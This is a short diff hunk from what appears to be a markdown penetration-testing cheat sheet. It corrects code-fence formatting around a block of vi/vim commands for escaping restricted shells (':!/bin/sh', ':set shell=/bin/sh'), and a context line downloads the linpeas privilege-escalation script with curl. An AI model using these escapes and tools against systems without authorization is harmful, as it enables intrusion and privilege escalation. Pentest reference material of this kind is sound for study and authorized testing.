@@ -72,12 +72,11 @@ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 ```
 
 Escape  restricted environments
-'''
+```
 :!/bin/sh
 :shell
 :set shell=/bin/sh
-'''
-
+```
 ## Port Scanning
 
 One-liner
